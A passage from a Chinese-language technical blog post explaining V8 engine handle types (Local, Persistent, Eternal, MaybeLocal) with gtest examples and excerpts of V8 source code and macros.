val_<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们可以通过<code>.方法名</code>来访问句柄对象的一些方法或通过重载后的<code>*</code>和<code>-&gt;</code>两个操作符得到这个句柄所引用对象的实体指针。</p><p>假设我们有一个字符串本地句柄<code>Local&lt;String&gt; str</code>，那么就可以有以下调用：</p><ul><li><code>str.IsEmpty()</code>句柄对象本身的函数，用于判断这个句柄是否是空句柄。</li><li><code>str-&gt;Length()</code>通过<code>-&gt;</code>得到<code>String*</code>，而String有一个方法Length可获取字符串长度，所以<code>str-&gt;Length()</code>是这个句柄所指的字符串实体的长度。</li></ul><p>我们同样可以使用As或者Cast函数来将某种数据类型的本地句柄转换成另一种类型的本地句柄，其中As是成员函数，而Cast是静态函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">v8::Local&lt;v8::Number&gt; nr = v8::<span class="hljs-built_in">Local</span>&lt;v8::Number&gt;(v8::Number::<span class="hljs-built_in">New</span>(isolate_, <span class="hljs-number">12</span>));<br>v8::Local&lt;v8::Value&gt; val = v8::Local&lt;v8::Value&gt;::<span class="hljs-built_in">Cast</span>(nr);<br><br>v8::Local&lt;v8::Value&gt; val2 = nr.<span class="hljs-built_in">As</span>&lt;v8::Value&gt;();<br></code></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8_test_fixture.h&quot;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalTest</span> : <span class="hljs-keyword">public</span> V8TestFixture &#123;<br>&#125;;<br><br><span class="hljs-built_in">TEST_F</span>(LocalTest, local) &#123;<br>  v8::Local&lt;v8::Value&gt; v;<br>  <span class="hljs-built_in">EXPECT_EQ</span>(<span class="hljs-literal">true</span>, v.<span class="hljs-built_in">IsEmpty</span>()) &lt;&lt; <span class="hljs-string">&quot;Default constructed Local should be empty&quot;</span>;<br><br>  <span class="hljs-comment">// A Local&lt;T&gt; can be converted into a MaybeLocal&lt;T&gt;</span><br>  v8::MaybeLocal&lt;v8::Value&gt; maybe = v8::<span class="hljs-built_in">MaybeLocal</span>&lt;v8::Value&gt;(v);<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(maybe.<span class="hljs-built_in">IsEmpty</span>());<br><br>  <span class="hljs-comment">// Both -&gt; and * return the value of the local.</span><br>  <span class="hljs-built_in">EXPECT_EQ</span>(*v, <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(v.<span class="hljs-keyword">operator</span>-&gt;(), <span class="hljs-literal">nullptr</span>);<br><br>  <span class="hljs-comment">// The following can be useful in if statement to add branch for</span><br>  <span class="hljs-comment">// when the local is empty.</span><br>  v8::Local&lt;v8::Value&gt; out;<br>  <span class="hljs-type">bool</span> has_value = maybe.<span class="hljs-built_in">ToLocal</span>&lt;v8::Value&gt;(&amp;out);<br>  <span class="hljs-built_in">EXPECT_FALSE</span>(has_value);<br><br>  <span class="hljs-comment">// Calling ToLocalChecked will crash the process if called on an empty</span><br>  <span class="hljs-comment">// MaybeLocal&lt;T&gt;</span><br>  <span class="hljs-comment">//ASSERT_DEATH(maybe.ToLocalChecked(), &quot;Fatal error&quot;);</span><br><br>  <span class="hljs-function"><span class="hljs-type">const</span> v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-comment">// Example of using Local::Cast:</span><br>  v8::Local&lt;v8::Number&gt; nr = v8::<span class="hljs-built_in">Local</span>&lt;v8::Number&gt;(v8::Number::<span class="hljs-built_in">New</span>(isolate_, <span class="hljs-number">12</span>));<br>  v8::Local&lt;v8::Value&gt; val = v8::Local&lt;v8::Value&gt;::<span class="hljs-built_in">Cast</span>(nr);<br>  <span class="hljs-comment">// Example of using As:</span><br>  v8::Local&lt;v8::Value&gt; val2 = nr.<span class="hljs-built_in">As</span>&lt;v8::Value&gt;();<br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="persistent">Persistent</h2><p>持久句柄提供了一个堆内存中声明的JavaScript对象的引用。持久句柄与本地句柄在生命周期上的管理是两种不同的方式。当你认为世界那么大，一个JavaScript对象不应该只存在于当前的HandleScope中，而应该出去看看的时候，就应该对这个JavaScript对象使用持久句柄。</p><p>举个简单的例子，Google Chrome中的DOM（Document ObjectModel）节点们在ChromeV8中就是以持久句柄的形式存在的，它们不局限在某个函数的作用域中。</p><p>持久句柄可以使用<code>PersistentBase::SetWeak</code>使其变弱，成为一个弱持久句柄。当对一个JavaScript对象的引用只剩下一个弱持久句柄时，ChromeV8的GC就会触发一个callback 。</p><p>除弱持久句柄以外，持久句柄还分唯一持久句柄（<code>v8::UniquePersistent&lt;...&gt;</code>)和一般持久句柄（<code>v8::Persistent&lt;...&gt;</code>)。</p><ul><li>唯一持久句柄使用C++的构造函数和析构函数来管理其底层对象的生命周期。</li><li>一般持久句柄可以使用它的构造函数来进行创建，但是必须调用<code>Persistent::Reset</code>来进行显式的清除。</li></ul><p>所以一个persistentobject是怎么创建的呢？让我们用下述代码来研究研究：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8_test_fixture.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/objects.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/slots-inl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/api/api-inl.h&quot;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> _v8_internal_Print_Object(<span class="hljs-type">void</span>* object);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PersistentTest</span> : <span class="hljs-keyword">public</span> V8TestFixture &#123;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Something</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">Something</span>(v8::Isolate* isolate, v8::Local&lt;v8::Object&gt; obj);<br>  <span class="hljs-function">v8::Persistent&lt;v8::Object&gt;&amp; <span class="hljs-title">persistent</span><span class="hljs-params">()</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">make_weak</span><span class="hljs-params">()</span></span>;<br><br> <span class="hljs-keyword">private</span>:<br>  v8::Persistent&lt;v8::Object&gt; persistent_handle_;<br>&#125;;<br><br>Something::<span class="hljs-built_in">Something</span>(v8::Isolate* isolate,<br>                     v8::Local&lt;v8::Object&gt; obj) : <span class="hljs-built_in">persistent_handle_</span>(isolate, obj) &#123;<br>&#125;<br><br><span class="hljs-function">v8::Persistent&lt;v8::Object&gt;&amp; <span class="hljs-title">Something::persistent</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> persistent_handle_;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">WeakCallback</span><span class="hljs-params">(<span class="hljs-type">const</span> v8::WeakCallbackInfo&lt;Something&gt;&amp; data)</span> </span>&#123;<br>  Something* obj = data.<span class="hljs-built_in">GetParameter</span>();<br>  std::cout &lt;&lt; <span class="hljs-string">&quot;in make weak callback...&quot;</span> &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">WeakCallbackVoid</span><span class="hljs-params">(<span class="hljs-type">const</span> v8::WeakCallbackInfo&lt;<span class="hljs-type">void</span>&gt;&amp; data)</span> </span>&#123;<br>  Something* obj = <span class="hljs-built_in">reinterpret_cast</span>&lt;Something*&gt;(data.<span class="hljs-built_in">GetParameter</span>());<br>  <span class="hljs-comment">//std::cout &lt;&lt; &quot;in make weak callback...&quot; &lt;&lt; &#x27;\n&#x27;;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Something::make_weak</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  auto cb = [](const v8::WeakCallbackInfo&lt;Something&gt;&amp; data) &#123;</span><br><span class="hljs-comment">        Something* obj = data.GetParameter();</span><br><span class="hljs-comment">        std::cout &lt;&lt; &quot;in make weak callback...&quot; &lt;&lt; &#x27;\n&#x27;;</span><br><span class="hljs-comment">  &#125;;</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> v8::WeakCallbackInfo&lt;Something&gt;::Callback Something_Callback;<br>  Something_Callback something_callback = WeakCallback;<br><br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> v8::WeakCallbackInfo&lt;<span class="hljs-type">void</span>&gt;::Callback v8_Callback;<br>  <span class="hljs-comment">//#if defined(__GNUC__) &amp;&amp; !defined(__clang__)</span><br>   <span class="hljs-comment">// #pragma GCC diagnostic push</span><br>    <span class="hljs-comment">//#pragma GCC diagnostic ignored &quot;-Wcast-function-type&quot;</span><br>  <span class="hljs-comment">//#endif</span><br>    v8_Callback cb = <span class="hljs-built_in">reinterpret_cast</span>&lt;v8_Callback&gt;(WeakCallbackVoid);<br>    <span class="hljs-comment">//persistent_handle_.SetWeak(this, WeakCallback, v8::WeakCallbackType::kParameter);</span><br>  <span class="hljs-comment">//#if defined(__GNUC__) &amp;&amp; !defined(__clang__)</span><br>    <span class="hljs-comment">//#pragma GCC diagnostic pop</span><br>  <span class="hljs-comment">//#endif</span><br><br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(PersistentTest, object) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(V8TestFixture::isolate_)</span></span>;<br>  v8::Handle&lt;v8::Context&gt; context = v8::Context::<span class="hljs-built_in">New</span>(isolate_,<br>                                         <span class="hljs-literal">nullptr</span>,<br>                                         v8::<span class="hljs-built_in">Local</span>&lt;v8::ObjectTemplate&gt;());<br>  v8::<span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br>  v8::Local&lt;v8::Object&gt; object = v8::Object::<span class="hljs-built_in">New</span>(isolate_);<br>  <span class="hljs-function">Something <span class="hljs-title">s</span><span class="hljs-params">(isolate_, object)</span></span>;<br>  s.<span class="hljs-built_in">make_weak</span>();<br>  <span class="hljs-built_in">EXPECT_EQ</span>(<span class="hljs-literal">false</span>, s.<span class="hljs-built_in">persistent</span>().<span class="hljs-built_in">IsEmpty</span>()) &lt;&lt; <span class="hljs-string">&quot;Default constructed Local should be empty&quot;</span>;<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(PersistentTest, PrintObject) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  v8::<span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  v8::Handle&lt;v8::Context&gt; context = v8::Context::<span class="hljs-built_in">New</span>(isolate_,<br>                                         <span class="hljs-literal">nullptr</span>,<br>                                         v8::<span class="hljs-built_in">Local</span>&lt;v8::ObjectTemplate&gt;());<br>  v8::<span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br><br>  v8::Local&lt;v8::Object&gt; obj = v8::Object::<span class="hljs-built_in">New</span>(isolate_);<br>  <span class="hljs-comment">//v8::internal::Object** ppo = ((v8::internal::Object**)(*obj));</span><br>  <span class="hljs-comment">//_v8_internal_Print_Object(*ppo);</span><br>  _v8_internal_Print_Object(*((v8::internal::Object**)*obj));<br><br>  v8::internal::Handle&lt;v8::internal::Object&gt; h = v8::Utils::<span class="hljs-built_in">OpenHandle</span>(*obj); <br>  _v8_internal_Print_Object((v8::internal::Address*)h-&gt;<span class="hljs-built_in">ptr</span>());<br><br>  v8::internal::Object o = *h;<br>  v8::<span class="hljs-function">internal::ObjectSlot <span class="hljs-title">slot</span><span class="hljs-params">(h-&gt;ptr())</span></span>;<br>  v8::internal::Address a = slot.<span class="hljs-built_in">address</span>();<br><br>  _v8_internal_Print_Object((v8::internal::Address*)v8::Utils::<span class="hljs-built_in">OpenHandle</span>(*obj)-&gt;<span class="hljs-built_in">ptr</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make ./persistent-object_test<br>./persistent-object_test --gtest_filter=PersistentTest.value<br></code></pre></td></tr></table></figure><p>与Local不同的是，持久句柄通常是通过Local升级而成，所以它通常是在构造函数中传入一个本地句柄。持久句柄的构造函数有几种常用的重载。</p><ul><li><code>Persistent()</code>直接创建一个持久句柄，这种方法获得的持久句柄通常会在后续再调用别的方法对一个本地句柄进行升级。</li><li><code>Persistent(Isolate *isolate, Local&lt;T&gt; that)</code>传入Isolate实例以及一个本地句柄，能得到这个本地句柄所引用的ChromeV8数据对象的一个持久句柄。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">Local&lt;Number&gt; local = Number:<span class="hljs-built_in">New</span>(isolate, <span class="hljs-number">2333</span>);<br><span class="hljs-function">Persistent&lt;Number&gt; <span class="hljs-title">persistent_handle</span><span class="hljs-params">(isolate, local)</span></span>;<br></code></pre></td></tr></table></figure><p>所以为了创建一个持久句柄，我们需要先创建一个Local</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">Local&lt;Object&gt; o = Local&lt;Object&gt;::<span class="hljs-built_in">New</span>(isolate_, Object::<span class="hljs-built_in">New</span>(isolate_));<br></code></pre></td></tr></table></figure><p><code>Local&lt;Object&gt;::New</code>能在<code>src/api/api.cc</code>中找到：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">Local&lt;v8::Object&gt; v8::Object::<span class="hljs-built_in">New</span>(Isolate* isolate) &#123;<br>  i::Isolate* i_isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(isolate);<br>  <span class="hljs-built_in">LOG_API</span>(i_isolate, Object, New);<br>  <span class="hljs-built_in">ENTER_V8_NO_SCRIPT_NO_EXCEPTION</span>(i_isolate);<br>  i::Handle&lt;i::JSObject&gt; obj =<br>      i_isolate-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">NewJSObject</span>(i_isolate-&gt;<span class="hljs-built_in">object_function</span>());<br>  <span class="hljs-keyword">return</span> Utils::<span class="hljs-built_in">ToLocal</span>(obj);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先将公有Isolate指针转换成指向内部类型的指针，LOG_API定义在<code>src\api\api-macros.h</code>中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOG_API(isolate, class_name, function_name)                        \</span><br><span class="hljs-meta">  RCS_SCOPE(isolate,                                                       \</span><br><span class="hljs-meta">            i::RuntimeCallCounterId::kAPI_##class_name##_##function_name); \</span><br><span class="hljs-meta">  LOG(isolate, ApiEntryCall(<span class="hljs-string">&quot;v8::&quot;</span> #class_name <span class="hljs-string">&quot;::&quot;</span> #function_name))</span><br></code></pre></td></tr></table></figure><p>LOG是定义在<code>src/log.h</code>中的宏：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOG(isolate, Call)                                 \</span><br><span class="hljs-meta">  do &#123;                                                     \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (v8::internal::FLAG_log) (isolate)-&gt;logger()-&gt;Call; \</span><br><span class="hljs-meta">  &#125; while (false)</span><br></code></pre></td></tr></table></figure><p>ENTER_V8_NO_SCRIPT_NO_EXCEPTION在<code>src\api\api-macros.h</code>中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ENTER_V8_NO_SCRIPT_NO_EXCEPTION(isolate) \</span><br><span class="hljs-meta">  i::VMState<span class="hljs-string">&lt;v8::OTHER&gt;</span> __state__((isolate));</span><br></code></pre></td></tr></table></figure><p>VMState做记录与分析用，StateTag表示VM的可能状态，logger维护着状态的一个堆栈。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;StateTag Tag&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">VMState</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-keyword">inline</span> <span class="hljs-title">VMState</span><span class="hljs-params">(Isolate* isolate)</span></span>;<br>  <span class="hljs-keyword">inline</span> ~<span class="hljs-built_in">VMState</span>();<br><br> <span class="hljs-keyword">private</span>:<br>  Isolate* isolate_;<br>  StateTag previous_tag_;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="eternal">Eternal</h2><p>一般认为这种句柄在程序的整个生命周期内是不会被删除的。比起持久句柄来说，永生句柄的开销更小（因为不需要垃圾回收），通常用不到，不再赘述。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">Eternal</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function">V8_INLINE <span class="hljs-title">Eternal</span><span class="hljs-params">()</span> : val_(nullptr) &#123;</span>&#125;<br>  <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">S</span>&gt;<br>  <span class="hljs-function">V8_INLINE <span class="hljs-title">Eternal</span><span class="hljs-params">(Isolate* isolate, Local&lt;S&gt; handle)</span> : val_(nullptr) &#123;</span><br>    <span class="hljs-built_in">Set</span>(isolate, handle);<br>  &#125;<br>  <span class="hljs-comment">// Can only be safely called if already set.</span><br>  <span class="hljs-function">V8_INLINE Local&lt;T&gt; <span class="hljs-title">Get</span><span class="hljs-params">(Isolate* isolate)</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function">V8_INLINE <span class="hljs-type">bool</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> val_ == <span class="hljs-literal">nullptr</span>; &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> S&gt; V8_INLINE <span class="hljs-type">void</span> <span class="hljs-title">Set</span><span class="hljs-params">(Isolate* isolate, Local&lt;S&gt; handle)</span></span>;<br><br> <span class="hljs-keyword">private</span>:<br>  T* val_;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="maybelocal">MaybeLocal</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MaybeLocal</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function">V8_INLINE <span class="hljs-title">MaybeLocal</span><span class="hljs-params">()</span> : val_(nullptr) &#123;</span>&#125;<br>  <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">S</span>&gt;<br>  <span class="hljs-function">V8_INLINE <span class="hljs-title">MaybeLocal</span><span class="hljs-params">(Local&lt;S&gt; that)</span></span><br><span class="hljs-function">      : val_(reinterpret_cast&lt;T*&gt;(*that)) &#123;</span><br>    <span class="hljs-built_in">static_assert</span>(std::is_base_of&lt;T, S&gt;::value, <span class="hljs-string">&quot;type check&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-function">V8_INLINE <span class="hljs-type">bool</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> val_ == <span class="hljs-literal">nullptr</span>; &#125;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Converts this MaybeLocal&lt;&gt; to a Local&lt;&gt;. If this MaybeLocal&lt;&gt; is empty,</span><br><span class="hljs-comment">   * |false| is returned and |out| is left untouched.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">S</span>&gt;<br>  <span class="hljs-function">V8_WARN_UNUSED_RESULT V8_INLINE <span class="hljs-type">bool</span> <span class="hljs-title">ToLocal</span><span class="hljs-params">(Local&lt;S&gt;* out)</span> <span class="hljs-type">const</span> </span>&#123;<br>    out-&gt;val_ = <span class="hljs-built_in">IsEmpty</span>() ? <span class="hljs-literal">nullptr</span> : <span class="hljs-keyword">this</span>-&gt;val_;<br>    <span class="hljs-keyword">return</span> !<span class="hljs-built_in">IsEmpty</span>();<br>  &#125;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Converts this MaybeLocal&lt;&gt; to a Local&lt;&gt;. If this MaybeLocal&lt;&gt; is empty,</span><br><span class="hljs-comment">   * V8 will crash the process.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function">V8_INLINE Local&lt;T&gt; <span class="hljs-title">ToLocalChecked</span><span class="hljs-params">()</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Converts this MaybeLocal&lt;&gt; to a Local&lt;&gt;, using a default value if this</span><br><span class="hljs-comment">   * MaybeLocal&lt;&gt; is empty.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">S</span>&gt;<br>  <span class="hljs-function">V8_INLINE Local&lt;S&gt; <span class="hljs-title">FromMaybe</span><span class="hljs-params">(Local&lt;S&gt; default_value)</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">IsEmpty</span>() ? default_value : <span class="hljs-built_in">Local</span>&lt;S&gt;(val_);<br>  &#125;<br><br> <span class="hljs-keyword">private</span>:<br>  T* val_;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在旧版本Chrome V8中，如下代码为例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">Local&lt;Value&gt; x = some_value;<br>Local&lt;String&gt; s = x.<span class="hljs-built_in">ToString</span>();<br>s-&gt;<span class="hljs-built_in">Anything</span>();<br></code></pre></td></tr></table></figure><p>在此段代码中，如果ToString()函数内部发生异常时，s将会是一个空的本地句柄，这时执行<code>s-&gt;Anything()</code>就会导致程序崩溃。所以，我们需要加一个<code>if(!s.IsEmpty())</code>判断才能保证程序的健壮性。但实际上有些数据类型的句柄并不需要检查IsEmpty，所以在旧版中可能返回空句柄的那些接口如今都会以MaybeLocal的形式来代替返回值，需要调用<code>ToLocalChecked</code>函数来拿到真正的本地句柄。</p><blockquote><p>MaybeLocal只是为了让你知道哪些地方的返回值需要检查是否为空，而不是确定一定不会返回空。若待实本地句柄为空，直接转换成Local还是会抛出异常。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">MaybeLocal&lt;String&gt; s = x.<span 